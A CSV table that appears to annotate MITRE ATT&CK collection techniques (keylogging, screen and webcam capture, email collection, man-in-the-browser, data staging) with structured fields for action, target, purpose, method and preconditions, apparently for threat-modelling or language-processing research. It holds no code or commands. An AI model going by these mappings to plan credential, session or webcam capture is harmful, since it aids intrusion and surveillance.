0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,1,,296,collection,input capture,t1056,log/capture/intercept,user input/keystroke,,,,,"acquire/obtain/capture,transmit-credentials; access new opportunities;inspect- user input field interception;",,,"performing a uac prompt , wrapping the windows default credential provider , keylogging",,,keylogging-enable,credential-captured,credential-captured,
1,,,297,collection,input capture,t1056,install/use,keylogger,,,,,capture and transmit credentials of users;  maintain network access,,,,,,,credential-captured; vlaid account; external remote services ,credential-captured; vlaid account; external remote services ,
1,,,297,collection,input capture,t1056,install-code ,portals/ vpn login,externally facing ,,,,capture and transmit credentials of users;  maintain network access,,,,,,portal-externally-reachable/vpn-externally-reachable ,credential-captured; vlaid account; external remote services ,credential-captured; vlaid account; external remote services ,
,1,,157,collection,data staged,t1074,stage/keep/combine/copy/store,data/file,compressed data/encrypted data,,,,Exfiltrate data/file,Exfiltrate,data/file,"use cmd, use bash, copy data, remote copy, rcp, ",,,<List all techniques that allow for data collection> AND location-access,new compressed/encrypted data/files stored in disk,new compressed/encrypted data/files stored in disk,
,1,,567,collection,screen capture,t1113 ,take/capture , screen/screen-capture/screenshot,,,,,gather information; capture screenshots,,,,use,native command screencapture/xwd,command-access,screen-captured,screen-captured,
,1,,197,collection,email collection,t1114,acquire/discover/collect,email-data/email-address,,machine is-a compromise; adversary has-a credential,,,"collect sensitive information;interact with exchange server, acquire information",,,Outlook storage; cache files .pst and .ost;access-webmail application/outlook web access,,,"email-servcer-access, credential-access",spear-phishing ,mailserver-access or emailclient-access,
,1,,747,collection,video capture,t1125,capture/write/record,video recording/image/video/image file/webcam,,,,,gather information,,,use malware/script,use,malware/script/peripheral device/integrated camera/webcam/application/video call service,device-access/webcam-access,vedio-captured,vedio-captured,
,1,,344,collection,man in the browser,t1185,inject-software/inject-code,browser,,,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic","setting up an http proxy, use-security vulnerability/browser functionality",use,security vulnerability/browser functionality,browser has-a SeDebugPrivilege; Process is-a high intigrity,,,
,,,344,collection,man in the browser,t1185,redirect,traffic,,browser has-a SeDebugPrivilege; Process is-a high intigrity,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic",set-http-proxy browser,set-http-proxy,browser,,,,
,,,344,collection,man in the browser,t1185,intercept-information ,browser,,,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic","setting up an http proxy, use-security vulnerability/browser functionality",use,security vulnerability/browser functionality,browser has-a SeDebugPrivilege; Process is-a high intigrity,,,
,,,344,collection,man in the browser,t1185,modify-behavior,browser,,,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic","setting up an http proxy, use-security vulnerability/browser functionality",use,security vulnerability/browser functionality,browser has-a SeDebugPrivilege; Process is-a high intigrity,,,
,,,344,collection,man in the browser,t1185,change-content,browser,,,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,  inherit  http sessions ,  inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic","change, modify, intercept, inherit, redirect","content,behavior,information,cookies/http sessions/ssl client certificates, http/https traffic","setting up an http proxy, use-security vulnerability/browser functionality",use,security vulnerability/browser functionality,browser has-a SeDebugPrivilege; Process is-a high intigrity,,,
,1,,152,collection ,data from local system,t1005,search,file system,,,compromise,computer,<what> find <\what> <where> files <\where> of interest  <what> gather <\what> <where> information <\where>;exfiltration,"find  ,  gather/collect","files  ,  information","command-line interface, such as cmd",,,,,,Automated Collection; Command-Line Interface
